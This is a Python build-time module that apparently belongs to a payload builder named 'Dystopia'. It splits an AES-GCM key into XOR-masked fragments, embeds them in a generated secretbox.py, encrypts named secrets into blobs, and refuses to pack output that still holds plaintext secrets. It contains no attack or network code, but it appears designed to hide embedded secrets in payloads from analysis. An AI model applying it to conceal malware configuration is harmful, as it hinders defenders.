# -*- coding: utf-8 -*-
"""Build-time secret obfuscation for Dystopia payloads.

Fail closed if cryptography is missing. Produces per-build key fragments
for libraries/secretbox.py and AES-256-GCM ciphertext blobs.
"""

from __future__ import annotations

import base64
import hashlib
import os
import re
import secrets
from pathlib import Path
from typing import Dict, Iterable, Mapping, Tuple

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError as exc:
    raise SystemExit(
        "[!] OBFUSCATE requires the cryptography package on the builder host.\n"
        "    pip install cryptography"
    ) from exc

ROOT = Path(__file__).resolve().parent
SECRETBOX_TEMPLATE = (ROOT / "secretbox.py").read_text(encoding="utf-8")

_PLACEHOLDER_RE = re.compile(r"\{F0_HEX\}|\{F1_HEX\}|\{F2_HEX\}|\{XOR_INT\}|\{SALT_HEX\}")


def _require_template() -> None:
    if not _PLACEHOLDER_RE.search(SECRETBOX_TEMPLATE):
        raise SystemExit(
            "[!] libraries/secretbox.py is missing build placeholders; "
            "refusing to obfuscate"
        )


def _assemble_key(f0: bytes, f1: bytes, f2: bytes, xor: int, salt: bytes) -> bytes:
    buf = bytearray(32)
    for i in range(16):
        buf[i] = f0[i] ^ f1[i] ^ (xor & 0xFF)
        buf[16 + i] = f2[i] ^ ((f0[i] + f1[i]) & 0xFF) ^ ((xor >> 8) & 0xFF)
    return hashlib.sha256(bytes(buf) + salt + b"dystopia-sb-v1").digest()


def generate_material() -> Dict[str, object]:
    """Return random key fragments for one build."""
    _require_template()
    return {
        "f0": secrets.token_bytes(16),
        "f1": secrets.token_bytes(16),
        "f2": secrets.token_bytes(16),
        "xor": secrets.randbits(16),
        "salt": secrets.token_bytes(16),
    }


def render_secretbox(material: Mapping[str, object]) -> str:
    """Fill secretbox.py placeholders with per-build key material."""
    text = SECRETBOX_TEMPLATE
    text = text.replace("{F0_HEX}", material["f0"].hex())
    text = text.replace("{F1_HEX}", material["f1"].hex())
    text = text.replace("{F2_HEX}", material["f2"].hex())
    text = text.replace("{XOR_INT}", str(int(material["xor"])))
    text = text.replace("{SALT_HEX}", material["salt"].hex())
    if "{F0_HEX}" in text or "{SALT_HEX}" in text:
        raise SystemExit("[!] failed to render secretbox key material")
    return text


def encrypt_secret(plaintext: str, material: Mapping[str, object]) -> str:
    key = _assemble_key(
        material["f0"], material["f1"], material["f2"], int(material["xor"]), material["salt"]
    )
    nonce = os.urandom(12)
    ct = AESGCM(key).encrypt(nonce, plaintext.encode("utf-8"), None)
    return base64.b64encode(nonce + ct).decode("ascii")


def encrypt_secrets(
    secrets_map: Mapping[str, str], material: Mapping[str, object] | None = None
) -> Tuple[Dict[str, str], Dict[str, object], str]:
    """Encrypt named secrets; return (blobs, material, secretbox_source)."""
    mat = material or generate_material()
    blobs = {name: encrypt_secret(str(value), mat) for name, value in secrets_map.items()}
    return blobs, mat, render_secretbox(mat)


def assert_no_plaintext(haystack: str, secrets: Iterable[str], label: str = "payload") -> None:
    """Fail closed if any secret substring remains in generated source."""
    for secret in secrets:
        if not secret or secret in ("None", "replace_me"):
            continue
        if secret in haystack:
            raise SystemExit(
                f"[!] Refusing to pack {label}: plaintext secret still present after obfuscation"
            )
